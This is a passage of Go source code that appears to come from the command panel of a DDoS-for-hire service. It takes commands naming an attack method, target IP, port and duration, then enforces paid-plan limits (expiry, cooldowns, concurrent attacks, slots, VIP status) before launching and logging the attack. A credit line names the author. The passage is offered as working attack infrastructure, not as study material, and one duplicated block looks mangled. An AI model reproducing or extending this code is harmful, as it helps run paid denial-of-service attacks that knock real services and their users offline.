			table.SetHeader([]string{"Username", "Target", "Port", "Duration", "Method"})
			table.SetAutoWrapText(false)
			table.SetAutoFormatHeaders(true)
			table.SetHeaderAlignment(tablewriter.ALIGN_LEFT)
			table.SetAlignment(tablewriter.ALIGN_LEFT)
			table.SetCenterSeparator("")
			table.SetColumnSeparator("")
			table.SetRowSeparator("")
			table.SetHeaderLine(false)
			table.SetBorder(false)
			table.SetTablePadding("\t") // pad with tabs
			table.SetNoWhiteSpace(true)
			table.AppendBulk(data) // Add Bulk Data
			table.Render()
			b, _ := gradient.NewGradient("#FE0944", "#FEAE96")
			this.SendMessage("\n"+b.Mutline(builder.String())+"\u001B[0m", true)
			continue
		}

		if cmd == "clear" || cmd == "cls" || cmd == "c" || cmd == "CLEAR" || cmd == "CLS" {
			this.ClearScreen()
			welcome := ui("welcome", nil)
			this.SendMessage(welcome+"\u001B[0m", true)
			this.conn.Write([]byte("\r\n\033[0m"))
			continue
		}
		if cmd == "help" || cmd == "HELP" || cmd == "?" {
			builder := &strings.Builder{}
			var data [][]string
			data = append(data, []string{"", ""})
			for command, description := range commandsWithDescription {
				data = append(data, []string{command, description})
			}
			table := tablewriter.NewWriter(builder)
			table.SetHeader([]string{"Name", "Description"})
			table.SetAutoWrapText(false)
			table.SetAutoFormatHeaders(true)
			table.SetHeaderAlignment(tablewriter.ALIGN_LEFT)
			table.SetAlignment(tablewriter.ALIGN_LEFT)
			table.SetCenterSeparator("")
			table.SetColumnSeparator("")
			table.SetRowSeparator("")
			table.SetHeaderLine(false)
			table.SetBorder(false)
			table.SetTablePadding("\t") // pad with tabs
			table.SetNoWhiteSpace(true)
			table.AppendBulk(data) // Add Bulk Data
			table.Render()
			b, _ := gradient.NewGradient("#FE0944", "#FEAE96")
			this.SendMessage("\n"+b.Mutline(builder.String())+"\u001B[0m", true)

			if userInfo.membership == 1 {
				builder := &strings.Builder{}
				var data [][]string
				data = append(data, []string{"", ""})
				for command, description := range commandsAdminWithDescription {
					data = append(data, []string{command, description})
				}
				table := tablewriter.NewWriter(builder)
				table.SetHeader([]string{"Name", "Description"})
				table.SetAutoWrapText(false)
				table.SetAutoFormatHeaders(true)
				table.SetHeaderAlignment(tablewriter.ALIGN_LEFT)
				table.SetAlignment(tablewriter.ALIGN_LEFT)
				table.SetCenterSeparator("")
				table.SetColumnSeparator("")
				table.SetRowSeparator("")
				table.SetHeaderLine(false)
				table.SetBorder(false)
				table.SetTablePadding("\t") // pad with tabs
				table.SetNoWhiteSpace(true)
				table.AppendBulk(data) // Add Bulk Data
				table.Render()
				b, _ := gradient.NewGradient("#FE0944", "#FEAE96")
				this.SendMessage("\n"+b.Mutline(builder.String())+"\u001B[0m", true)
			}
			continue
		}

		if err != nil || cmd == "exit" || cmd == "quit" || cmd == "logout" {
			return
		}
		if len(args) == 1 {
			//check in args[0] is in methods list
			methods := getMethodsList()
			if contains(methods, args[0]) {
				this.SendMessage("\u001B[91mUsage <method> <ip> <port> <time>\u001B[0m", true)
			}
			continue
		}

		accountExpired := database.isAccountExpired(userInfo.username)
		if err != nil || cmd == "credits" || cmd == "credit" || cmd == "info" {
			return
		}
		if len(args) == 1 {
			methods := getMethodsList()
			if contains(methods, args[0]) {
				this.SendMessage("\u001B[91mcette source a ete ecrite par royaloakap\u001B[0m", true)
			}
			continue
		}

		if accountExpired {
			this.SendMessage("\u001B[91mYour plan has expired.\u001B[0m", true)
			continue
		}

		attacksEnabled := config("attacksenabled")
		if attacksEnabled != "true" && userInfo.membership != 1 {
			this.SendMessage("\u001B[91mAttacks are currently disabled.\u001B[0m", true)
			continue
		}

		if !strings.HasPrefix(args[1], "http://") && !strings.HasPrefix(args[1], "https://") {
			if !validIP4(args[1]) {
				this.SendMessage("\u001B[91mInvalid host.\u001B[0m", true)
				continue
			}
		}

		log.Println("\u001B[0m\u001B[107m\u001B[38;5;220m[NEW ATTACK]\u001B[0m \u001B[38;5;15m" + userInfo.username + "\u001B[0m \u001B[38;5;15m" + cmd + "\u001B[0m")
		log.Println("Checking if host is blocked: ", args[1])
		if len(args) != 1 && userInfo.membership != 1 {
			blockedIPS := readBlacklistedIPs("blacklistedIPs.json")
			blockedHost := false
			for _, blockedIP := range blockedIPS {
				log.Println("Checking if host is blocked: ", args[1], " with: ", blockedIP)
				log.Println("Contains: ", strings.Contains(args[1], blockedIP))
				if strings.Contains(args[1], blockedIP) {
					blockedHost = true
					break
				}
			}
			if blockedHost {
				this.SendMessage("\u001B[91mThis host is blocked.\u001B[0m", true)
				continue
			}
		}

		if userInfo.membership != 1 {
			log.Println("Checking if user is spamming.")
			if database.isSpamming(args[1]) {
				this.SendMessage("\u001B[91mSpam protection. You cant hit this target in few minutes.\u001B[0m", true)
				continue
			}
		}

		currentAttacks := database.getCurrentAttacksLength()
		log.Println("How much attacks are running: ", currentAttacks)
		slots := config("slots")
		slotsIntFromConfig, err := strconv.Atoi(slots)
		if err != nil {
			log.Println("Error converting slots from config to int: ", err)
			continue
		}
		log.Println("Checking if slots are in use: ", currentAttacks, "/", slotsIntFromConfig)
		if currentAttacks > slotsIntFromConfig {
			this.SendMessage("\u001B[91mSlots are currently in use.\u001B[0m", true)
			continue
		}

		if userInfo.membership != 1 {
			log.Println("Checking if user is on cooldown.")
			howLongCooldown := database.howLongOnCooldown(userInfo.username, userInfo.cooldown)
			log.Println("How long on cooldown: ", howLongCooldown)
			if howLongCooldown > 0 {
				b, _ := gradient.NewGradient("#FFBE0B", "#F42B03")
				this.SendMessage(b.Apply("You are on cooldown. ("+strconv.Itoa(howLongCooldown)+" seconds left)")+"\u001B[0m", true)
				continue
			}
		}

		checkUserRunningAttacks := database.getUserCurrentAttacksCount(userInfo.username)
		log.Println("Checking users running attacks: ", checkUserRunningAttacks)
		log.Println("Checking users concurrents: ", userInfo.concurrents)
		if checkUserRunningAttacks >= userInfo.concurrents {
			this.SendMessage("\u001B[91mYou have reached your concurrents limit.\u001B[0m", true)
			continue
		}

		vip := database.isVip(userInfo.username)
		log.Println("VIP: ", vip)

		private := database.isPrivate(userInfo.username)
		log.Println("Private: ", private)

		admin := false
		if userInfo.membership == 1 {
			admin = true
		}
		log.Println("Admin: ", admin)

		maxtime := userInfo.maxtime

		atk, err := NewAttack(cmd, vip, private, admin, maxtime)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			this.SendMessage("Sending an attack!", true)
			err, errMsg, msg := atk.Build()
			this.ClearScreen()
			if err == true {
				this.SendMessage(fmt.Sprintf("\u001B[91m%s\u001B[0m", errMsg.Error()), true)
			} else {
				//send message in format "Attack sent using [method] to [target]:[port] for [time] seconds."
				this.SendMessage(msg, true)
				//this.SendMessage("\u001B[92mAttack successfully sent.\u001B[0m", true)
				//send attack webhook
				database.logAttack(userInfo.username, atk.Target, atk.Port, int(atk.Duration), atk.MethodName)
			}
		}
	}
}

func validIP4(s string) bool {
	ip := net.ParseIP(s)
	if ip == nil {
		return false
	}
	return true
}

func contains(methods []Method, s string) bool {
	for _, a := range methods {
		if a.Method == s {
			return true
		}
	}
	return false
}

func (this *Admin) SendMessage(message string, newline bool) {
	if newline {
		this.conn.Write([]byte(message + "\r\n"))
	} else {
		this.conn.Write([]byte(message))
	}
}

func (this *Admin) ClearScreen() {
	this.conn.Write([]byte("\033[2J\033[1;1H"))
}

func (this *Admin) SetTitle(message string) {
	this.conn.Write([]byte("\033]0;" + message + "\007"))
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
